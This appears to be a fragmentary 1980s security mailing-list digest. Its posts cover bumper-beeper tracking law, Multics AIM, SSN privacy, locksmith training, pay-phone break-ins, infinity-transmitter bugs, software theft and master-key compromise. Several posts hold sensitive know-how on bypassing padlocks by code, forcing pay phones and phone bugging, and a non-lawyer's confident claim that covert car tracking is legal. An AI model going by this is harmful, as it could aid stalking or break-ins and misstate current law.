was overturned because the suspect did have a reasonable expectation
of privacy inside his home: US v. Karo 104 S. Ct. 3296 (1984) "Montoring
of a beeper to trail a container into a house and...  keep[ing] in touch with
it inside the house... did violate the 4th amendment."

Now as to leaving a bumper beeper on someone else's car:  There are things
that the police can do that others can't, but I don't think trailing 
cars with gadgets is one of them.    I'd guess that it is legal for anyone
to use a bumper beeper for trailing a car in public.  It's hard to
imagine a criminal charge coming out of trailing a car.  Trespass isn't
appropriate since there is no entering the car, and assuming the beeper
was placed when the car was parked on a city street and not in the guy's
garage, there's no real property trespass either.  If someone gets
mud on your bumper he hasn't trespassed -- likewise if he puts a gadget
there.  You're not monitoring communication, so none of the wiretapping
laws would help.  Since there is no reasonable expectation of privacy
as to movements, you're not violating the target's civil rights, either.
There might be a shot at a vandalism charge, but he'd have to show that
the beeper damaged the car in some way.   Damages might arise from the
result of being trailed and maybe the beeper could be worked into a civil
suit -- juries probably wouldn't like the idea of following someone by 
bumper beeper too much and might think the follower was a bad guy, but
then again it might not be treated as relevant evidence; it probably depends
on the skill of the lawyers involved.

I'm not a lawyer, so I wouldn't take this as the last word, but I am
pretty familiar with the laws about privacy in the US and it seems to
me that putting a bumper beeper on and following someone's car  is
completely legal.  I think this is wrong, but that doesn't make it illegal.
It is probably not the case that you could put a similar device on the
person or some other possession of his, because if you "keep in touch 
with" it (what ever that means) while he is inside his house, you have
violated his civil rights.  Your car is not a domain where you have much
in the way of privacy rights.

Note: It is probably the case that you are abandoning the beeper when
you put it on the car, so if the target finds the beeper it's his to
do with as he pleases (I'd put it on a truck heading someplace remote
and see who follows...)

I used AIM at the Pentagon for 4 years.  Indeed in some circumstances it
was cumbersome, but effective.  Typically, a project is associated
with one security classification, and one can "log in" at one level to work
on it.  The real problems come when one is logged in, say, at the Top Secret
level, and wants to modify a file at the Secret level.  If he copies the
file from the Secret (directory) hierarchy to the Top Secret hierarchy, 
the system treats the data as Top Secret and a security officer must
intervene to downgrade it at a later time.  His only real alternative is to
create a new process at the lower authorization.  Yes, this is a pain, 	but
I don't see many other alternatives.  

But I don't agree that AIM renders the system unsuable -- at least not in an
environment where mandarory access control levels (like the military or
government) are in place.  In private industry, perhaps, AIM is overkill.

AIM is also a real pain when such per-use databases such as profiles, 
init files, and mailboxes are concerned.  The former two must be maintained
at the lower classification/authorization level and modified only at the
level -- a burden for most.  Mailboxes on Multics, being multi-level, force
the user to log in at the highest authorization to read all the messages,
but prevent him from deleting old messages at any level but the level at
which the message was sent (or destined).  This is also an inconvenience.
 
> It _is_ used on MIT-MULTICS to a certain degree, to keep the backup

That is certainly a bizarre use of AIM and one which makes my stomach turn
(having worked on the Multics security effort at Honeywell for some time).
There are, however, other Multics sites using AIM, including some in the
university environment, where grade protection was considered a suitable
need for AIM.

Take care.  -- Eric

I doubt that your central computing service is trying to put "port

facilities. Since they probably have this funny thing called a "budget"
to work within, the accountants most likely have forced them to find
ways to equitabily charge out resource usage. I suspect that YOUR

Subj:	[6042]  Re: SSN

    In reply to the few examples people brought up of how someone can destroy
    you with a knowledge of your SSN:
    (1) The activities--getting the false drivers license, using it to obtain
    information about you, etc... are all serious criminal offenses. The
    abuser would cause you some hassles, which you would eventually clear up, 
    and eventually find himself in jail with felonies on his record, drunk
    driving, etc.... 
    
This is a bit naive.  First, although using false identification is a
crime, it is not a serious one in most states.   Using false information
to obtain a credit card is also a crime, although again, credit card
fraud is not a high priority for most police departments.  Winning a
civil suit is always possible in the case of fraud, but it would be
difficult and expensive for a victim to track down and prosecute the
perpetrator.

Second, the idea that all this might cause the victim "some hassles,
which you would eventually clear up" is simply wrong.  People can get
badly hurt by this stuff.  Here's a recent court case that should frighten
you:

 A Federal Judge in Los Angeles has confirmed a Michigan man's account
 of his three year nightmare of police arrests based on an error in the
 FBI's computer.  The judge has ordered the police department that
 originated the error to pay the man damages.

 The nightmare of Terry Rogan of Saginaw begin in 1981, when an escapee
 from an Alabama prison received a copy of Rogan's birth certificate
 from a mutual acquaintance.  The escapee assumed Rogan's identity and
 obtained a California driver's license in Rogan's name.  The man was
 eventually arrested in LA on suspicion of murder.  The suspect was
 released, but LA police later issued a murder arrest warrant in the
 name of Terry Rogan.  Omitted from the warrant, however, were the suspects
 known physical characteristics, including a tattoo.

 If Terry Rogan, back home in Michigan, were the sort of fellow who never
 has a confrontation with the police, the erroneous warrant probably
 would have done him no harm.  But Terry Rogan is black.  Black males
 in urban areas have a probability of being arrested far greater than
 that of any other segment of the population.

 In 1982, Rogan was accused of trespassing by police in Saginaw county.
 He was then arrested on charges of resisting arrest.  In accord with
 ususal policy, police queried the FBI's National Crime Information Center
 under Rogan's name.  They got back a "hit," the California warrant in
 Rogan's name.  The NCIC entry had no other identifying information even
 though, according to the court, the system permits up to 121 characters
 to be entered for this purpose.

 After comparing fingerprints and discovering from LA that the wanted
 man had a tattoo and that Rogan did not, police released him -- four
 days later.  But within a few weeks, LA police reentered the Rogan name
 into NCIC.  Within six months Rogan was stopped near his home for failing
 to use a turn signal.  Officers ran a computer check on him, and again
 the murder warrant showed up.  Rogan was searched, handcuffed at gunpoint
 and then arrested.

 Rogain was arrested again, this time for a traffic offense, and was
 again detained until the LA arrest warrant was explained.  Rogan then
 asked an FBI agent in Saginaw to correct the entry; he was told to go
 to Los Angeles to do it himself.  He was also told to write his
 Congressman.

 In July 1983 Rogan travelled to Texas to find work; there he was stopped
 for speeding.  Again, because of the NCIC "hit," he was handcuffed at
 gunpoint and taken to jail.  At about this time, LA police again reentered
 the warrant into NCIC.  Not surprisingly, in January 1984, Rogan was
 again apprehended at gunpoint, this time for driving without his
 headlights on, back home in Saginaw.  By then local police officers
 knew all about the unfortunate Terry Rogan.  He was promptly released.
 But no one would make the effort to correct the FBI entry.  It took
 a reporter from the "Saginaw News" to initiate the erasure process.
 The NCIC record was deleted, and the felon in Alabama was eventually
 convicted of the LA homicide.

 The LA police department gave officers operating their end of the NCIC
 system no training in how to delete or amend data once they had entered
 it into the system, according to US District Judge Robert J. Kelleher.
 Neither of the two officers involved thought about amending the NCIC
 record after they were notified of Rogan's mistaken identity..

 One officer's policy in these situations, the court said, "was to  give
 the innocent person a computer printout of the warrant and his business
 card as evidence of the person's innocence ONLY IF the person came to
 Los Angeles and picked up the items personally." ... The court found
 the City of Los Angeles liable for damages to Rogan, calling its conduct
 "both grossly negligent and systemic in nature" in depriving Rogan of
 his constitutional right to be free of faulty warrants.  Rogan v. Los
 Angeles 85-0989 (CD Cal, 20 July 1987)

[The preceding is quoted, with permission, from the Privacy Journal, an
excellent publication available for $98/year from Box 15300 Washington
DC 20003.]

Notice that all that trouble arose merely over use of the name.  With
a social security number, it is possible that credit records could also
become involved.  Victims of this kind of activity are badly hurt --
no doubt about it.  If instead of a police mistake, it had been the actions
of an private individual that had caused the trouble, the chances of
compensation would be remote.  Compared to having a car vandalized, being
repeatedly arrested at gunpoint, spending days in jail (very unpleasant!),
loss of credit rating, etc. seem much more serious.  Never underestimate
the power of those 9 digits.

Larry,
    "A bit naive" may be accurate if you want to spend your life worrying
about getting hit by meteors and all sorts of other remote problems.  Although
not as serious as murder, credit card fraud and obtaining a false id will
cause the perpetrator various serious trouble. I am pretty sure in the example
listed, the crimes are felonies, although not extremely serious ones. Once
convicted the guilty party will have a very difficult time obtaining any job
where any degree of trust is involved, especially with the increase in the
usage of background checks, etc.  Of course there are people so messed up that
they don't care about this kind of thing, as in the case you mentioned where
the original perpetrator was a prison escapee.
    Injustice has happened before there were computers and widespread usage of
SSN's.  I am sure that we will still have to continuing fighting these cases
as long as there is civilization. However the possibility of the kind of
hassle mentioned in the article to which I replied is probably less than that
of being hit by a car, robbed at gunpoint, or harrassed in a more
"traditional" manner. It is rather pointless to end up with high blood
pressure, heart disease, depression, and lost productivity because you spend
half of  your life fighting the phone companies or someone elses usage of your
SSN or any other number.
    In response to your closing statement about having your credit rating
trashed is worse than having your car vandalized.  That is true if you have
your car vandalized only once and collect the insurance. There are plenty of
cases of peoples lives being made  miserable by repeated harassment,
firebombings, beatings, etc...  Frankly I would much rather be suing TRW to
get my credit rating restored than visiting a close family member in the
hospital or worse the morgue.  I know of people who have been forced out of
their homes and killed or wounded as a result of "non-computer" harassment.

Medeco) and, when turning the cylinder, there seems to be a very loose
fit.
   Locksmiths in the area (Manhattan, lots of lock stores) don't know
anything about it.  And the original owner said you have to send proof
of purchase to scandinavia to key a duplicate key.
   Is this lock of any theoretical interest?

	If you have a minimum of $ 10K to spend, you can do it "the right
way"...
	There is a company called Ocean Applied Research (O.A.R.) in
San Diego which manufacturers sophisticated radio direction finders and
locating transmitters.  The direction finders are available in various
models which cover frequency ranges from LF (0.05 MHz) to UHF (520 MHz).
These direction finders provide an a polar oscillographic display of
bearing and relative signal strength.  These systems use stationary
antennas of the Adcock-type for fixed or marine installation, and of
a low-profile ferrite loop type for vehicular or aircraft installation.
The O.A.R. direction finding equipment is fairly compact, and is suitable
for permanent or temporary installation aboard ships, aircraft and
vehicles.
	O.A.R. direction finding equipment is extensively used for search
and rescue operations, animal tracking for natural sciences research,
location of unlawfully-operated radio transmitters, and for "other"
purposes.  O.A.R. is considered the "Cadillac" of non-milspec direction
finding apparatus (you don't even want to _know_ the cost of equivalent
military-grade apparatus).
	O.A.R. does manufacture transmitters for tracking purposes, although
most of their transmitters are intended for oceanographic studies.

Subj:	[1410]  Computer security systems.

Frankly, this computer security issue is the biggest load of bilge I've
ever heard. It seems so obvious that most computers should not be open,
the whole issue is a waste of bandwidth.
        Banks have safes. Houses and cars have locks. I doubt that the
proponents of "open-systems" leave their houses and cars unlocked. Our
society suffers the inconvenience of security not because the society
as a whole is bad, but rather because a select few are bad. And so we
must all suffer the inconvenience. Those who think systems should be open
must also believe that all people are good. Talk about a pipe|dream.
History has proven that computer security is necessary. Those who choose
to ignore this are either destined to repeat history, or should see
the reality of things.
        I don't want to really get into politics here, but consider this
example. Why do the soviets and the u.s. have such an arms buildup? Why
do we spend so much on security? Gracious, the soviet secretary general
has never even SEEN this country. The answer is simple. Because neither
country can ASSUME the other won't try something. That would be reckless,
and there is too much at stake. Computers (and any security for that matter)
must work on the same principles. One cannot ASSUME safety. One must
ensure it.

One would think the decision to re-key or not would be settled by a
conversation between the University's and their Insurance company's
lawyers. Unless they don't mind leaving the campus in a situation
where claims might be disallowed based on a lack of minimally
acceptable security practices. Most University's self-insure up to a

The Belsaw locksmithing course is fairly good, and you end up with a
key machine that is adequate for most routine key cutting.  You also
have the opportunity to purchase supplies, and as I recall you can
start a subscription to the National Locksmith magazine, which gets
you bonded.  Most communities require practicing non-student locksmiths
to be registered; some have started to require certification tests.
It is a good idea to comply, since otherwise they might run you in
for possession of "burglar tools".  (This despite the fact that very
few actual burglars use locksmithing tools, except possibly for
automobile door opening tools.)

Once you have your student locksmith card and National Locksmith
subscription, it isn't too difficult to get locksmith supply
companies to deal with you.  You might consider investing in a
supply of professional business cards, saying something like
"Joseph M. Blow -- Security Consulting Services".  When I was at
Rice, a group of students set up a small firm "Richard E. Ingram
Associates" and had letterheads printed, etc.  It doesn't take
very much to gain some degree of credibility in the business world.

You can also perhaps get a limited amount of equipment and supplies
from a company like Curtis that supplies the corner 7-11 key shop.
They're mostly good for key blanks and of course key machines.  The
"Curtis code clipper" was a handy little portable device for making
keys by code; that and a Curtis Master padlock code book would get
you into a lot of places (because people often don't erase the code
number printed on the face of Master padlocks).  I even had a
favorable Dun & Bradstreet rating for a while as a result of
dealing with Curtis.

If you're going to get into the locksmith business, please make
sure you develop a good sense of professional ethics, not using
your skills to trespass or cause damage or loss to others.

I once worked at a high school and they had just this problem.  Someone had
compromised the master and they were faced with finding a solution.  This
particular school was constructed in a campus type arrangement with ten
buildings, each with eight exterior doors.  Keying was in a master/submaster/
individual scheme, layered as appropriate.

The school system had their own internal locksmith department, doing all the
keying themselves.  Budgets being what they are, they took the cheap way out.
They designated two exterior doors in each building to be re-keyed and plugged
all the others with epoxy.

Columbia University was the same way.  There were two or three sets of

they figure that the amount in labor (union wages) isn't worth paying

Subj:	[1928]  RE: Re:  Picking locks on pay phones

I worked as a teleco lineman one fall (an engineering co-op job).  
As part of that work we had to go around and extract the cash
boxes from the payphones.

They gave us a large ring of keys (not a master key).  Incidentally,
we never really touch the coins, they fall into a coin box that gets
replaced when we open up the phone.

As for the phones being alarmed, I really don't believe it.  Except
for high crime areas maybe.  On one occasion we had a phone that
would not open at all.  The key mechinism was jammed (it came from
a high school -- I wonder who jammed it?).  I got to try and
break into the phone -- fun fun.

We tried drilling out the lock.  We trashed a drill bit or two
doing it but we managed to get a nice hole through the lock cylinder.
Well, that was fun, but it got us no where.  It still wouldn't open.

We decided to take the phone off of the wall.  The mounting bracket
was designed so that you only had access to the mounting screws if
the phone was unlocked.  I really don't remember how we did it, but
we got it off of the wall (probably by brute force -- I had a BIG partner).

By the way, no alarms went off.  No police arrived on the scene.  Remember
this was in a high school -- If they alarmed phones in general, I wouldn't
expect them to have the high school phone disabled.

Anyway, we managed to get the damn thing open by lots of prying with
large screwdrivers (used as crowbars) and some hammering.  The phone
was totally worthless -- but we got the money back to the telco
(the phone had to be replaced anyway, can't leave them until they
fill up with coins).

This was a small telco in southern indiana, Bell systems and
GTE may do things differently.

>  He told me that they were alarmed, and that if you open

	If this is true, it only applies to newer electronic coin telephones,
and NOT the traditional single-slot coin telephones such as the WECO free
standing types (1A, 1C series) or the WECO "panel-mounting" types (2A, 2C
series).
	The only thing close to an "alarm" is that some coin telephones had
a coin "bank" [the proper term] with an electrical contact on the top.  When 
the bank gets full of coins, a ground is effectively placed on this contact.
This ground is placed in series with a resistor which places a high resistance
ground to one side of the telephone line.  This condition can be periodically
scanned by automatic equipment in the central office to ascertain if a coin
telephone bank is full.  Actually, I have only seen this done on some early
multi-slot coin telephones during the 1960's, and I don't believe this feature
was even provided on single-slot coin telephones.
	Coin telephone repairpersons usually have no keys for access to the
coin bank portion of a coin telephone.  There is actually no need for them
to have access, since all repairs can be made with the upper housing opened.
Opening the upper housing gives no access to the coin bank; you would need
something like string and chewing gum :-) to extract any coins from the bank.
Restricting coin bank keys to coin collection (and not repair) personnel
gives telephone companies a better sense of security.
	Coin banks have a sliding cover with an interesting lever mechanism;
the coin banks are intended to be provided with a wire seal.  With the seal
intact, the bank can be inserted and removed from a coin telephone ONLY ONCE.
There is no way to remove a full coin bank and open the cover to get access
to the coins without breaking this seal.
	Quite frankly, telephone company security personnel seem more paranoid
about employee theft from coin telephones than from theft committed by the
general public.  Occasionally, a malfunctioning coin collection mechanism
will cause a few coins to spill into the upper housing where a repairperson
might have access to them.  The proper procedure is to take the coins, place
them in a special envelope, label it and seal it right away; the envelope
is to be turned in to supervisory personnel as soon as possible.  Some BOC
security personnel seem to have nothing better to do than plant "marked"
coins in the upper housing of a coin telephone, and try to bait some
repairperson into not properly turning in the money.
	I also find amusing the following introductory paragraph as quoted 
from a BOC coin telephone service manual: "Social changes during the 1960s
made the multi-slot coin station a prime target for: vandalism, strong arm
robbery, fraud and theft of service.  This brought about the introduction
of the single slot coin station and a new environment for coin service."
Social changes?! :-)
	My knowledge of coin telephones ended with the single-slot series
mentioned above.  I have almost no idea what happens inside the new-fangled
coin telephones with CRT's and credit-card readers.

I don't know about these new phones that other companies other than MaBell are
putting out but the old standard pay phones are not alarmed. They have 8
tumbler locks on them so it is VERY difficult to pick these open. I have heard
stories about people hooking up a van to a pay phone to pull it out and the
axle was ripped out from the van. Another story from the north (Canada) was to
pour water into the coin slot, let it freeze over then hit the phone so it 
splits open. The reason why the phone company switch to these more secure pay
phone was that people were breaking into the older models and they needed to 
collect more money (by the way, the phone company spends aprox $1800 per pay
phone plus any other extras they want to add like a light or special set-up for
it).

Hope this information helps.

I have had some experience with two of the above schools.  I graduated from
the Foley Belsaw Institute course which does a reasonable job of covering
the basics, but the course is a bit dated.  You will not learn about
interchangeable cores, opening modern cars, or pushbutton locks.  Foley
Belsaw does provide you with the connections to obtain proper bonding and
subscriptions to the two popular trade magazines (National Locksmith and
Locksmith Ledger).  Foley Belsaw will also provide you with locksmithing
supplies at a reasonable cost, but once you make connections via the trade
publications the sky is the limit.  It is a wonderful way to increase your
locksmithing knowledge and be right with the law at the same time.  They
also provide you with an extremely useful key machine which can copy keys
and cut them by code w/o depth keys.

I sent away for the NRI course information and found that while the course
was a little better packaged than the Foley Belsaw course it cost roughly 3
times as much!  I would not recommend the NRI course unless you have big
bucks to burn.

Seems the security folks have tracked him across the nation.  He used
to be a machinist.  He's never hit a Medeco lock, only "old telco" 
boxes (whatever those are).

As for the 20 minute time frame?  Forget it.  The guys I talked to said,
"He's just about as fast as a guy with a key."  The favorite story: the

This is wrong, according the pay phone specialits I interviewed for an 
article I wrote.  I was just at the North American Telecomm. Association
show in Dallas, and they had a big payphone pavillion there.

The only way these guys know a phone has been hit is when they come to
empty it.

I spoke with the folks at Medeco (they had a big display of their "virtually
pick proof lock) and they verified the problem with pay phone locks.

You see, it seems that with the influx of private pay phones, these guys were
starting to toss "crap on the market" (crap being locks) and they cared more
about profits than good security (a topic of conversation that only recently
began getting any kind of hearing in the pay phone industry).

BUT...cracking the lock box is not the BIG DEAL.  The *real* story is that
guys are ripping off the expense COMPUTER BOARDS and electronics in the
upper half of the phones.  These boards run some $300 or $400 a piece and
according to one security analyst, "There's a huge black market for these
boards."  Interestingly enough, the locks protecting the electronics
are far easier to pick than the coin box lock.

"These guys are more worried about protecting $20-$50 in coins rather than
$300-$400 in electronics," the rep from Medeco said.

You figure it.

>I suspect that vandalism would still be rare (my basic optimism in humanity)
>but when it did occur it would be drastic 

I tend to agree with that statement. It seems to me that the basic problem is
that you are going to let all these people lose on the system and then for
fun one of them is going to delete the system. However you are forgeting one
thing in such a system if you kept track of deletetions and zero length over
writes and the like you could take real world action against such people i.e.
you can do what you want but if we catch you the results are going to be
messy. 

  Another soultion is to have a large elite, i.e. the number of people who
would have total access would larger then it is now and people would get to
such a postion simply by being trustable in the eyes of the current users. I
don't know if any of you know of MIT's ITS(incompatable timesharing system)
in which the users had free roam. When you login to ITS it tells you how many
users there are on the system
USERS : 5
but someone changed it to say
LOSERS: 5
it was changed back and forth a few times and finaly setteled on
LUSERS: 5
something that was acceptable to all.

An other complaint is that someone will eat up all of the CPU or disk space
but what you dont see is that if everyone is equal then if there are 5 people
on the system then if everyone is using CPU munching programs then the CPU
time will be split 5 ways and if someone does not need all of theirs it will
be split among the rest. As far a disk space split it evenly among the users
and if someone needs more they can have it by general consensus.

My basic point is that the users are responsible to someone, they are
responsible to the group and if that is not enough then they should not be
admitted to the group.  It may appear that I am contradicting my self by
saying there should be a group, but I bow to reality I that there will always
be people that can not be trusted but if there are allowed to use the system
they it should be as equals not as subordinates.

Subject:  SSN's

In a recent message, Larry Hunter described some quite awful things happening
to a person because a police department get his name by mistake, and used
that as an argument against giving out your SSN.

Are such mixups more likely, or less likely, if police departments use
SSN's as a key rather than personal names (or whatever would be used
instead if we all refused to give out our SSN)?  If someone wants to
impersonate someone, they are as likely (or more) to do it on the basis
of a name as a social security number; you also have the possibility
of duplicate names (yes, these have also caused problems without any
misrepresentation by any party involved).

The problem is not the identifying key used; one problem is the non-
robustness of data (if the tattoo in Larry's example had been included
in the warrant and checked by the officers, this might not have arisen).
Any method of keeping data requires a unique key for a person.  One hopes
that in the case of critical data, there will be some secondary data
which, even if not unique, will verify that the primary key is valid.

What really worried me about Larry's story was the fact that a birth
certificate (which has no picture and only minimal physical description)
is often regarded as the ultimate ID in our society.

Subject: Re: SSN

Jonathan,      

I apologize for calling your characterization a bit naive.  Let's look
at where we might agree.   First, in my original posting I concluded
my nasty scenario with the following caveat:

        Paranoid?   Sure.  I don't think this sort of thing happens very
        often, but it provides an idea of the power in those 9 digits.
        I personally believe that the institutional (mis)use of SSNs
        is by far a worse problem than the kind of criminal behavior
        I just described, but I find the latter is more persuasive to
        people who are cavalier about having "nothing to hide".

You made this point more strongly:

    ... Injustice has happened before there were computers and widespread
    usage of SSN's.  I am sure that we will still have to continuing
    fighting these cases as long as there is civilization. However the
    possibility of the kind of hassle mentioned in the article to which
    I replied is probably less than that of being hit by a car, robbed
    at gunpoint, or harrassed in a more "traditional" manner.

Your point is well taken.  SSN based abuse is not all that likely.  On
the other hand, it is sobering to realize how important records about
us are to our well being.  People can indeed suffer significant harms
because of records about them.

    It is rather pointless to end up with high blood pressure, heart
    disease, depression, and lost productivity because you spend half
    of  your life fighting the phone companies or someone elses usage
    of your SSN or any other number.

This I have a harder time with.  Although I try not to get too stressed
out over it,  I think there are real problems arising from institutional
abuse of SSNs.  My concerns (and my reasons for holding my SSN closely)
are as I stated originally:

    The practical reasons to associate your SSN with as few records about
    you as possible have to do with the fact that large, powerful entities
    (like the IRS and large consumer products companies) use techniques
    like block modelling and record matching to exert significant power
    over individuals.

Do not underestimate the hidden uses of SSNs.  They are more important,
although sometimes less publically compelling than the criminal ones.
Consider some of the decisions that information associated with SSNs effects:

* Whether or not you get audited by the IRS.

* How much your health, life and property insurance cost, and whether
  or not it is available to you at all.

* Whether you are granted credit to buy a house, or a car, or get a credit
  card (the latter is used as an important distinguishing factor between
  "haves" and "have nots" in our society).

* Your access to government assistance (from farm loans to student aid
  to aid to families with dependent children).

* Who becomes the target of law enforcement investigations.  Computer
  matching of records is a rapidly growing source of prosecutions that
  strikes me utterly without probable cause.  Also, don't forget that the
  Church Committee investigation of the US intelligence community in the
  late 70's said that the ability of the government to track and monitor
  individuals, if turned to repressive ends, would be sufficient to squash
  all dissent.  Much of that ability derives from computer record keeping
  based on unique personal identifiers.

* How large corporations sell their goods to consumers.  Information
  associated with you (perhaps associated with SSNs, although it has not
  been demonstrated) is used to target specific advertising that has been
  shown to be effective on people "like" you.  Different (possibly
  contradictory) advertising may be shown to others.

* How politicians influence you to vote.  Although (like advertisers
  for consumer goods) use of SSNs has yet to be documented, politicians
  use techniques based on personal information similar to that of other
  advertisers to influence your political opinion.

Not all of these possible uses (and abuses) of SSNs are commonplace,
but many of them are.  Part of our role as members of this community
is to try to foresee threats to our privacy and security and inform others
about them.  I believe that, although such threats may pale in comparison
to physical violence, they are significant and worthy of discussion.
The Privacy Act of 1974 which limited uses of SSNs, held that unique
personal identifiers in wide use were an important threat to individual
rights.  I agree with that sentiment, and would suggest that threat is
more significant now than ever before.

 Yes, infinity transmitters do exist. they work on the principle that
the audio path is made even before a dialed phone starts to ring.
one sends a tone down the line which tells the infinity transmitter
to "pick up" the phone before the ringing starts, and can then listen
to teh location where the bug is planted. however these devices are
pretty much made obsolete by the fact that any of the ESS switches
do not open an audio path untill they receive answer supervision
from the dialed end.

Subject: Re: Infinity

    Ever heard of an "Infinity Transmitter"?
    
Yeah, they are pretty old tech bugging devices.  They used to work fine,
but with the advent of separate signalling and voice circuits in ESS
(the electronic version of Ma Bell's switching system) they became
obsolete.

The idea was that the bug would listen to the phone line for a tone.
When it heard the tone (or combination of tones -- they were called
harmonica bugs because people often used harmonica notes to trigger them)
it would pick up the phone and you could listen to what was going on
in the room that the phone was in, before the phone rang.  The problem
in ESS is that the caller is not connected to the line when it is
ringing -- the audio connection is only made when the phone is picked
up -- so the bug cannot hear the incoming tone.  No audio path to
transmit the tone, no infinity bugs.

One might imagine more sophisticated versions of the infinity bug;  It
could pick up the line WHENEVER it rings, check for the tone, do the
infinity bug thing is the tone is present and if the tone weren't present
it would have to generate its own ringing voltage (for the phone) and
ringing tone (for the caller) until the line really got picked up.   As
you might imagine, the ESS infinity bug would have to be much more
complicated (read more expensive and more likely to be detected) than
the old style ones.  I've never heard of anyone trying this.

There are lots of telephone exchanges that are not ESS (step and crossbar
are the two main alternatives) where the simple old infinity bugs still
work fine.  Any exchange where "Custom Calling" (e.g. call forwarding
or call waiting) is not available is probably not ESS.

People still sell things like infinity bugs as "home baby sitters" or
as burgler alarms, but they answer the phone all the time even though
they only turn the mike on if they receive a tone.  These are usueless
as bugs because no one can make calls TO the target -- the bug always
answers the phone.

You can rest easy re: infinity bugs, although you should be aware that
it is a pretty trivial task to use electronic surveillance these days
and that a lot of people do it.

I saw an article on these once (on a bboard that got closed down about
a year later for phone credit card postings). The main idea was that
someone who wanted to tap the room would add this little circuit board
to the phone, which would detect some sort of tone on the line when
the phone first rang, inhibit the ring, and open the microphone.
Something was mentioned about ultrasound (unlikely, given the quality
of the phone lines, but it was being vague), and how you
could tap in from anywhere as long as you could dial direct (ie. even
from England). The main flaw was that the phone was of course busy (to
the outside world) the whole time you were monitoring. It was
allegedly used extensively by PI's to gather ``evidence'' for divorce

     There is a public domain program from PcSig called Alter.Com that allows
 the changing of the archive bit.  I am sure that there are a number of others

     This seems to work very well, here at the university.  There are

 there is no way that students can find them.  The programs are not executed
 by DOS Batch files.  There is a menu program that the students "myself

 keys to make the selection.  Once the selection is made, entering a carriage

Stolen software causes a direct overhead to the University in the form
of consultant's time wasted trying to help people who first rip
you off for the program;  then keep bugging you for help because
they have no manual for the program and are guessing how it works;
then have problems because their illegal copy doesn't get updated
by the manufacturer for bug fixes, and finally steal your copy
of the manual, leaving you with the bill.
	Two common tactics are (1) doing a label swap for "key" disks
(i.e., Lotus 123), so that it can be borrowed and a blank returned
in its place (at least $50 worth of hassle each time);  removing
pages from those lovely ring binder manuals everyone uses.
	There isn't ANY solution to theft that doesn't penalize honest
users heavily;  as it is our procedures are much more inconvenient
to our users than our original policies and we still have problems.
Still, doing nothing makes the situation even worse.
	For commonly ripped off programs we have at times resorted to
a roll-your-own copy protection (even for those programs which
weren't copy protected originally), just to begin to defend ourselves
against this problem.
	I don't support SELLING software as copy protected, but I think
any facility should have the option of protecting their own legal
copies to restrict them to their legal use.

>Since they probably have this funny thing called a "budget"

The cost of maintaining a large IBM mainframe and interconnecting Ethernets
(e.g. with PC's) is a constant, irregardless of usage.  While DP professionals
make it seem like you are using up a "resource" which must be "accounted for",
in actuality those expenses should be a constant number of dollars in the
Computing Center's budget. Any other form of accounting discourages use of the
available computer resources, thus harming productivity. Considering that a
big IBM 3090 installation can handle over 400 users easily for the "mere" cost
of 6 million dollars or so (about what a big computer costed 20 years ago!),
we have the anomoly of companies buying big computers for whatever reasons
(prestige? Array-processor coprocessor?), and then having that computer
languish mostly unused because of restrictive accounting and security
practices. 

This is not, of course, related to 3rd-party computing resources, i.e. you own
a mainframe, and local businesses contract with you for computing resources.
In that event, it of course makes sense to distribute your constant cost
amongst them based upon their usage of the system, plus a profit margin atop
that. But for internal computer resouces, not only is such an accounting
irrelevant (the company still spends the same amount of money, no matter WHAT
departments are charged for it), but counter-productive too (since it
discourages use of the computer resources). After all, why do you think that
personal computers have become so popular, despite being quite limited in what
they can do? Simple: people no longer have to go through 20 layers of
bureaucracy in order to gain access to computer resources, and they don't have
to cope with a mentality that says computer resources are limited and rare and
should be used sparingly -- a mentality that may have made sense when a large
timesharing computer costed $15,000,000 (in today's dollars) and accomodated
only 100 users, but in today's world, such an attitude is patently absurd (as
personal computers amply demonstrate).

I have witnessed large program development projects on Multics, with AIM

efforts deal with only one level of information (classification), so AIM does
not even come into play.  In those program with more than one level of

First, an understanding, I'm not analyzing a black box, I *am*
management in said computing center, tho my relationship with
some of these entities is purely horizontal.

No, no one is imposing anything (at least in terms of some external
force with power saying "account for that!"), the buck stops here. The
only thing imposed is of course budget constraints. There are several
ways to manage these things.

On the one hand it sounds intuitively appealing to become a utility
and charge on a strict usage basis. On the other hand the two forces
working against that is, first, the fear (not entirely unrealized)
that a massive amount of the revenue for that sort of charging just
goes right back into the process of generating charges. For example,
systems programmers to add proper accounting methods to software,
applications programmers to build summary statistics and account
maintenance software, source licenses which might only be needed
because of a self-imposed requirement to account in a uniform manner,
administrative help to deal with accounts, apply chargebacks, chase
down delinquent accounts (eg. people who keep running up charges after
their grants run out, whaddya gonna do? sue them?), hear poverty cases
(also known as "if you could seed us this amount we could prototype
and get granted within two years", or, "I know I'm out of money but if
I don't get enough freebies to finish this grant the University's name
is mud"), management time to simply provide a design and guidelines
etc etc etc etc.

The second force is that we all do, at some level, eat out of the
same trough. Internally organizations (University's are not unique in
this respect) are really much more like socialist organizations with
perhaps a limited form of capitalism (eg. light and heat are paid for
by the central organization out of "heavy taxation", also known as
overhead chargebacks to contract income.) A lot of waste could be
saved by establishing uniform "taxation" to cover these costs just
as we do with other things on the campus. People who overuse such
facilities can be dealt with in other ways, the feedback mechanism
of chargeback systems is not at all ideal, just one possibility.

It's all rather subtle, really.

It depends to some degree on how the masterkeying scheme is set up,
but in general it would indeed be possible to switch to a different
master (at the level of the stolen one) while invalidating few or
none of the other keys in the system.  During the transition,
presumably legitimate possessors of the master would also have the
new one, so that the locks could be gradually changed over.

Sounds like you should abandon keys altogether and replace the locks

 a card access system.
Here at the Univ. of Manitoba we have a card access system controlling
access to our more important areas, including the mainframe computer room,
and one "terminal" area filled with IBM PS2s. (our system has just expanded
to 16 doors controlled by card access).
Other areas have combination locks.
  Both system allow quick and easy "rekeying" -if you
suspect the code has become known change the code. If a card is
lost or stolen - disable the card.
 We also have burglar alarm systems installed in most areas, sending
a signal to the campus police and to the computer room (staffed 24 hrs)

For example, if you have a distinct area within the building that can be
locked up tight, with *very* restricted keying and no mastering, that might be
a viable method.  I'd also suggest some alarm systems for the computers
themselves, if not for the whole area.  You  might also look into pressure
sensitive alarm pads, so that if a computer is moved more than a preset
amount, alarms go off at the campus security area, or even the local police
station.  Personally, I'd vote for a Medeco, non-master system on the doors.
Good luck!

The only sugestion I can offer is to add an alarm system to the

type of locks was used on a door to a 10 Million dollar lab as
was used on a class room with two nubs of chalk and a worn out
eraser.  Portable equipment PC's, typeriters, calculators,

theft.  But the problem is more than theft.

The loss of control of master keys is a real nasty problem in a

school.  Two years after the fact I heard a tail of a quant.
chem.  class that someone aced the curve on because he 'salted'
